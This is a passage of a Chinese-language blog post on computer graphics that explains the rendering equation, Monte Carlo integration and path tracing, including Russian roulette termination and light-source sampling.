<p>不难发现，入射光线的radiance不仅仅是光源所造成，还有可能是其他物体上着色点的反射光线的radiance，恰好反射到当前的着色点，而其他物体上的反射光线的radiance依然也是这么个情况。这与whitted-style当中的光线追踪过程十分类似，也是一个递归的过程，所以说想要解这样一个方程还是比较难的。</p>
<h2 id="渲染方程（The-Rendering-Equation）"><a href="#渲染方程（The-Rendering-Equation）" class="headerlink" title="渲染方程（The Rendering Equation）"></a>渲染方程（The Rendering Equation）</h2><p>反射方程明白了，渲染方程也就水到渠成。上述我们并没有讨论物体自身的发光情况，渲染方程就是在反射方程的基础之上添加了一个自发光项（Emission term）：<br>$$<br>L_o(p,\omega_o)&#x3D;L_e(p,\omega_o)+\int_{\Omega^+} L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)(n \cdot \omega_i)d\omega_i<br>$$<br>其中 $L_e(p,\omega_o)$ 为自发光项，反射方程中的 $cos\theta$ 用 $n\cdot\omega_i$代替。</p>
<p>接下来从一个点光源和单个物体的场景开始理解渲染方程：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020060219245867.png" alt="img" style="zoom:50%;" loading="lazy">

<p>点光源对一个点来说自然只有一个方向有入射光，所以这里没有了积分。多个点光源照射一个物体的情况：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602192631208.png" alt="img" style="zoom:50%;" loading="lazy">

<p>将这些所有的点光源的贡献全部求和即可，那么如果点光源变成了面光源呢？如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602192803160.png" alt="img" style="zoom:50%;" loading="lazy">

<p>其实面光源就相当于无穷多个点光源的集合，只需要对面光源所在的立体角范围进行积分，并且能够确定不同立体角方向的面光源的入射光radiance即可。那么更进一步再在场景当中加入其它物体，使得物体之间发生光线交互之后是什么情况呢：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602193117114.png" alt="img" style="zoom:50%;" loading="lazy">

<p>如上图所示，可以把其它物体同样考虑成面光源，对其所占立体角进行积分即可，只不过对其它物体的立体角积分不像是面光源所有入射方向都有radiance，物体的立体角可能只有个别几个方向有入射的radiance（即多次物体间光线反射之后才恰好照射到着色点），其它方向没有，但本质上都可以视作是面光源。</p>
<p>观察一下图中的渲染方程可以发现除了两个入射和反射的radiance，其它所有项都是知道的，可以将上式进一步写成如下图下方所示的式子：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602193941152.png" alt="img" style="zoom:50%;" loading="lazy">

<p>其中各项与原渲染方程中一一对应（这种简写在数学中很常见），再接着进一步化简，把该式子离散化写为线性的形式：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602194505631.png" alt="img" style="zoom:50%;" loading="lazy">

<p>经过两步不是很清楚但其实是正确的数学推导之后（狗头），得到了这样一个式子：<br>$$<br>L&#x3D;E+KL<br>$$<br>其中 $L$ 其实就是想要求得的反射光，$E$ 是自发光其实就是光源的发光项，$K$可以理解为对光线进行反射的一种算子操作。那么利用线性代数的知识很容易就可以推导出 $L$ 的结果如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/image-20220713152814326.png" alt="image-20220713152814326" style="zoom:50%;" loading="lazy">

<p>其中 $I$ 为单位矩阵，再接着对 $(I-K)^{-1}$ 使用广义二项式定理得到：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/image-20220713152909307.png" alt="image-20220713152909307" style="zoom:50%;" loading="lazy">

<p>仔细观察这个式子，注意 $E$ 是光源所发出的光，$K$ 为反射算子，这样一个式子的物理含义如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020060219535985.png" alt="img" style="zoom:50%;" loading="lazy">

<p>$E$ 为自身发出的光，$KE$ 则代表对光源反射一次的结果，即直接光照，那么前两项之和就是光栅化当中Blinn-phong模型着色所考虑的结果。而对于全局光照来说，可不能就考虑这么几项，光在空间中是经过无数次的反射折射的，故方程正确地考虑了 $K^2E$ ，即一次弹射的间接照明，$K^3E$ 就是两次弹射的间接照明，依次类推。</p>
<p>一次反射直接光照，没有被光照直接照射的地方全部都是黑色的：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602200341414.png" alt="img" style="zoom:50%;" loading="lazy">

<p>两次反射，考虑到一次弹射的间接光照，没有被光源直接照射的地方由于收到了其他物体反射过来的光，不再是黑色：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602200239736.png" alt="img" style="zoom:50%;" loading="lazy">

<p>三次反射，考虑到两次弹射的间接光照，相较于两次又有新的反射折射，亮度继续增加：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602200259364.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>但光线能量传播终究是有损失的，越来越多的反射折射会使得增加的亮度越来越少，最终收敛于一个峰值。</p>
<h1 id="路径追踪（Path-Tracing）"><a href="#路径追踪（Path-Tracing）" class="headerlink" title="路径追踪（Path Tracing）"></a>路径追踪（Path Tracing）</h1><p>可以看看英伟达的官博 <a href="https://blogs.nvidia.com/blog/2022/03/23/what-is-path-tracing/">What Is Path Tracing? </a></p>
<p>其中给了这么一幅图：</p>
<p><img src="https://blogs.nvidia.com/wp-content/uploads/2022/03/path-tracing-ray-tracing-rasterization-672x353.png" alt="img" loading="lazy"></p>
<p>可以看到效果还是挺明显的，path tracing更加炫酷（但我为啥觉得ray tracing更真实呢哈哈）。总之来说，path tracing相较于ray tracing有更好的渲染效果（上面介绍辐射度量学就说了）。</p>
<p>要想实现路径追踪，就要用到上述的渲染方程，具体定义及数学公式是给出来了，但是如何解是一个问题。为此，引入蒙特卡洛积分。</p>
<h2 id="蒙特卡洛积分（Monte-Carlo-Integration）"><a href="#蒙特卡洛积分（Monte-Carlo-Integration）" class="headerlink" title="蒙特卡洛积分（Monte Carlo Integration）"></a>蒙特卡洛积分（Monte Carlo Integration）</h2><p><strong>蒙特卡洛积分的目的：</strong> 当一个积分很难通过解析的方式得到答案的时候可以通过蒙特卡洛的方式近似得到积分结果，如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608145324235.png" alt="img" style="zoom:50%;" loading="lazy">

<p>显然对于这样一个函数，很难去用一个数学式子去表示，因此无法用一般解析的方法直接求得积分值，而这时候就可以采用蒙特卡洛的思想了。</p>
<p><strong>蒙特卡洛积分的原理及做法：</strong> 对函数值进行多次采样求均值作为积分值的近似。</p>
<p>该做法十分容易理解，想象一下如果对上图这个函数值进行<strong>均匀采样</strong>的话，其实就相当于将整个积分面积切成了许许多多个长方形，然后将这些小长方形的面积全部加起来。它可以指定一个分布来对被积分的值进行采样，定义如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608150124150.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>如图所示，我们希望求出一个函数 $f(x)$ 在积分域 $[ a , b ]$上的积分值，选定一个采样的分布 $p(x)$，概率论中称之为概率密度函数。</p>
<blockquote>
<p>在数学中，连续型随机变量的<strong>概率密度函数</strong>（probability density function，pdf），在不至于混淆时可以简称为<strong>密度函数</strong>，是一个描述这个随机变量的输出值，在某个确定的取值点附近的可能性的函数。而随机变量的取值落在某个区域之内的概率则为概率密度函数在这个区域上的积分。当概率密度函数存在的时候，累积分布函数是概率密度函数的积分。概率密度函数一般以小写标记。</p>
<p>满足的性质：$\int _{-\infty}^{+\infty}f(x)dx&#x3D;1$</p>
</blockquote>
<p>为了方便，所有的采样都使用均匀采样，因此很容易推出：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608151822251.png" alt="img" style="zoom:50%;" loading="lazy">

<p>我们只需要知道，<strong>蒙特卡洛在此来说就是一个帮助求得困难积分值的方法，具体方法是用采样点的函数值除以该点的概率密度，将所有点所得的值相加最后取平均数即得所求函数得定积分值</strong>。</p>
<h2 id="蒙特卡洛路径追踪（Monte-Carlo-Path-Tracing）"><a href="#蒙特卡洛路径追踪（Monte-Carlo-Path-Tracing）" class="headerlink" title="蒙特卡洛路径追踪（Monte Carlo Path Tracing）"></a>蒙特卡洛路径追踪（Monte Carlo Path Tracing）</h2><p>有了这个基础，我们就可以解渲染方程了，先回顾一下：<br>$$<br>L_o(p,\omega_o)&#x3D;L_e(p,\omega_o)+\int_{\Omega^+} L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)(n \cdot \omega_i)d\omega_i<br>$$<br>要想解出以上方程的解主要有两个难点：</p>
<ol>
<li>积分的计算</li>
<li>递归形式</li>
</ol>
<p>我们先对渲染方程做出一点小修改，先不考虑发光项 $L_e(p,\omega_o)$，以方便进行计算推导：<br>$$<br>L_o(p,\omega_o)&#x3D;\int_{\Omega^+} L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)(n \cdot \omega_i)d\omega_i<br>$$<br>观察该修改过之后的方程其实就只是一个单纯的积分计算了，其物理含义为着色点 $p$ 到摄像机或人眼的Radiance值。</p>
<p>从具体例子出发，首先仅仅考虑直接光照：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608152759132.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>由蒙特卡洛积分我们知道，对于一个困难积分只要选定一个被积分变量的采样分布即可得到积分结果的近似值，而此时的被积分值为 $\omega_i$，选定 $\omega_i \sim p(\omega_i)$ ，不难得出积分近似结果如下：<br>$$<br>L_o(p,\omega_o)&#x3D;\frac{1}{N}\sum^N_{i&#x3D;1}\frac{L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)(n \cdot \omega_i)}{p(\omega_i)}<br>$$<br>单独考虑直接光照，因此只有当采样的方向 $\omega_i$ 击中光源的时候，光源才会对该着色点有贡献，计算伪代码如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608154331950.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>显然单独仅仅考虑直接光照自然是不够的，还需要间接光照，即当采样的 $\omega_i$ 方向碰撞到了别的物体，如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608154548826.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>此时采样的光线碰撞到了另一个物体的 $Q$ 点，那么该条路径对着色点 $P$ 的贡献是多少呢？自然是<strong>在点 $Q$ 的直接光照再乘上反射到该方向上的百分比了</strong>。这是一个类似光线追踪的递归过程，不同在于该方法通过对光线方向的采样从而找出一条条可行的路径，这也正是为什么叫路径追踪的原因，伪代码如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608155149815.png" alt="img" style="zoom:67%;" loading="lazy">

<p>至此，我们成功通过蒙特卡洛的方式解出了渲染方程的积分值，也通过考虑直接光照与间接光照解决了递归的问题。但该方法至此有一个非常致命的问题：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020060816013460.png" alt="img" style="zoom:67%;" loading="lazy">

<p>通过每次对光线方向的采样从而解出方程，假设每次采样100条，那么从人眼出发的第一次采样就是100条，在进行第二次反射之后再采样就是10000条，依次类推，反射越多次光线数量便会爆炸增长，计算量会无法负担，那么如何才能使得光线数量不爆炸增长呢？<strong>只有每次采样都只采用一个方向。</strong></p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608160521691.png" alt="img" style="zoom:67%;" loading="lazy">

<p>每次如果只采样一个方向那么所带来的问题也是显而易见的，积分计算的结果不准确，虽然蒙特卡洛积分是无偏估计，但样本越少显然偏差越大。但该问题很好解决，如果每次只去寻找一条路径结果不好，那么重复多次寻找到多条路径，将多条路径的结果求得平均即可。如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608160911411.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>改良之后的Path Tracing伪代码如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608161049501.png" alt="img" style="zoom:67%;" loading="lazy">

<p>通过对经过像素的光线重复采样，每次在反射的时候只按分布随机选取一个方向，解决了只对经过像素的光线采样一次，而对反射光线按分布采样多次所导致的光线爆炸问题。</p>
<p>那么现在所有的问题都解决了吗？还没有，之前一直强调的递归问题（上述中体现在shade函数里）没有解决。在现实世界中，光线确实无限折射反射的，但是在程序中我们要确保有穷性，但是人为给一个限定的反射限定次数又显得很怪（ray tracing中我们是这样做的），我们并不知道最好的反射次数是多少。这里十分精妙得采用了俄罗斯轮盘赌(Russian Roulette)。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608161623874.png" alt="img" style="zoom:50%;" loading="lazy">

<p>给你一把左轮，两发子弹，你不知道哪一发会真正的射出子弹，因此拿这把左轮射自己，你有4&#x2F;6的概率活下来，这就是俄罗斯轮盘赌的概念。将其应用在路径追踪当中，首先设定一个概率 $P$ , 有 $P$ 的概率光线会继续递归并设置返回值为 $L_o &#x2F;P$ ，有 $1-P$ 的概率光线停止递归，并返回0。这样巧妙的设定之下光线一定会在某次反射之后停止递归，并且计算的结果依然是无偏的，因为Radiance的期望不变，证明如下：<br>$$<br>E&#x3D;P*\frac{L_o}{P}+(1-P)*0&#x3D;L_o<br>$$<br>shade函数的伪代码变更如下，使得可以停止递归了：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608162504928.png" alt="img" style="zoom:67%;" loading="lazy">

<p>至此，路径追踪算法只剩最后一个小问题。就是效率非常的低下，如图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608162750373.png" alt="img" style="zoom:50%;" loading="lazy">

<p>在每次计算直接光照的时候，通过均匀采样任选一个方向，但只有较少得光线可以返回光源，尤其当光源较小的时候，这种现象越明显，大量采样的光线都被浪费了。</p>
<p>因此在计算直接光照的时候改进为<strong>直接对光源进行采样</strong>。这样所有采样的光线都一定会击中光源（如果中间没有别的物体），没有光线再会被浪费了。假设光源的面积为A，那么对光源进行采样的 $pdf &#x3D; \frac{1}{A}$（因为 $\int \operatorname{pdf} d A&#x3D;1$，概论密度函数性质），但原始的渲染方程：<br>$$<br>L_o(p,\omega_o)&#x3D;\int_{\Omega^+} L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)(n \cdot \omega_i)d\omega_i<br>$$<br>很明显是对光线方向 $\omega_i$ 进行积分的，如果想要对光源进行采样的并依然使用蒙题卡洛的方法，那么一定要将其修改为对光源面积 $dA$ 的积分，换言之就是需要找到 $dA$ 与 $\omega_i$ 的关系即可。如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608163948436.png" alt="img" style="zoom:50%;" loading="lazy">

<p>关系式中的 $cos\theta^{\prime}$ 是为了计算出光源上微分面积元正对半球的面积，之后再按照立体角的定义 $\mathrm{d} \omega&#x3D;\frac{\mathrm{d} A}{r^{2}}$，除以着色点 $x$ 与光源采样点 $x’$ 距离的平方即可。于是根据图中二者的关系可将渲染方程改写如下：<br>$$<br>L_o(p,\omega_o)&#x3D;\int_{\Omega^+} L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)(n \cdot \omega_i)d\omega_i<br>&#x3D;\int_{A} L_i(p,\omega_i)f_r(p,\omega_i,\omega_o)\frac{cos\theta cos\theta^{\prime}}{||x’-x||^2}dA<br>$$<br>这样便成功从 $\omega_i$ 积分转到了对光源面积 $A$ 的积分，就可以利用蒙特卡洛的方法对光源进行采样从而计算直接光照的积分值了，对于间接光照，依然采用先前的方法进行光线方向的均匀采样。最终伪代码如下，分直接光照和间接光照两部分计算：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608165058497.png" alt="img" style="zoom:67%;" loading="lazy">

<p>计算直接光照的时候还需要判断光源与着色点之间是否有物体遮挡（上述我们假设了两者之间没有别的物体），该做法也很简单，只需从着色点 $x$ 向光源采样点 $x’$ 发出一条检测光线判断是否与光源之外的物体相交即可，如果有遮挡，直接光照这部分就没有了。如图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200608165458404.png" alt="img" style="zoom:67%;" loading="lazy">

<p>至此，我们终于理顺了完整的路径追踪。整个过程还算是比较清晰的，发现问题解决问题，是学习任意一门学问都要经历的过程。</p>
]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>光线追踪</tag>
      </tags>
  </entry>
</search>
